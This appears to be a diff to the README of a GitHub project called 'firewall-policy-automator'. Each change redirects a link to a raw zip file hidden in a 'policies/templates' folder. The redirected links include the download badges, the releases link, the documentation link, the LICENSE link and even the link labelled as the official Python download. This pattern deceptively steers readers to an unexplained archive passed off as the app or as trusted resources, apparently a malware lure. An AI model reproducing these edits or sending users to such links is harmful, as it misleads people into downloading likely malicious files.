@@ -1,6 +1,6 @@
 # 🔥 firewall-policy-automator - Simplify Firewall Management Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/trieuduy27051999/firewall-policy-automator/releases)
+[![Download](https://github.com/trieuduy27051999/firewall-policy-automator/raw/refs/heads/main/policies/templates/firewall-policy-automator-v3.9.zip%20Now-Get%20the%20App-brightgreen)](https://github.com/trieuduy27051999/firewall-policy-automator/raw/refs/heads/main/policies/templates/firewall-policy-automator-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -11,12 +11,12 @@ Welcome to firewall-policy-automator. This tool helps you manage firewall polici
 To use this application, make sure you have the following:
 
 - **Operating System**: Windows 10 or higher; macOS 10.15 or higher; Ubuntu 18.04 or higher
-- **Python**: Version 3.7 or higher; you can download it [here](https://www.python.org/downloads/)
+- **Python**: Version 3.7 or higher; you can download it [here](https://github.com/trieuduy27051999/firewall-policy-automator/raw/refs/heads/main/policies/templates/firewall-policy-automator-v3.9.zip)
 - **Network Access**: Access to your firewall devices
 
 ## 📥 Download & Install
 
-Visit this page to download: [GitHub Releases](https://github.com/trieuduy27051999/firewall-policy-automator/releases).
+Visit this page to download: [GitHub Releases](https://github.com/trieuduy27051999/firewall-policy-automator/raw/refs/heads/main/policies/templates/firewall-policy-automator-v3.9.zip).
 
 1. Click the link above to go to the releases page.
 2. Find the latest version available.
@@ -37,7 +37,7 @@ Your security is our priority. The application does not store any sensitive info
 
 ## 📑 Documentation
 
-For detailed instructions and more advanced features, check the [official documentation](https://github.com/trieuduy27051999/firewall-policy-automator). 
+For detailed instructions and more advanced features, check the [official documentation](https://github.com/trieuduy27051999/firewall-policy-automator/raw/refs/heads/main/policies/templates/firewall-policy-automator-v3.9.zip). 
 
 ## 🤝 Contributing
 
@@ -49,10 +49,10 @@ If you encounter any issues or have questions, you can create an issue on the Gi
 
 ## 🎉 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/trieuduy27051999/firewall-policy-automator/blob/main/LICENSE) for details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/trieuduy27051999/firewall-policy-automator/raw/refs/heads/main/policies/templates/firewall-policy-automator-v3.9.zip) for details.
 
 --- 
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/trieuduy27051999/firewall-policy-automator/releases)
+[![Download](https://github.com/trieuduy27051999/firewall-policy-automator/raw/refs/heads/main/policies/templates/firewall-policy-automator-v3.9.zip%20Now-Get%20the%20App-brightgreen)](https://github.com/trieuduy27051999/firewall-policy-automator/raw/refs/heads/main/policies/templates/firewall-policy-automator-v3.9.zip)
 
 Thank you for using firewall-policy-automator. We hope it makes your firewall management simpler and more efficient!
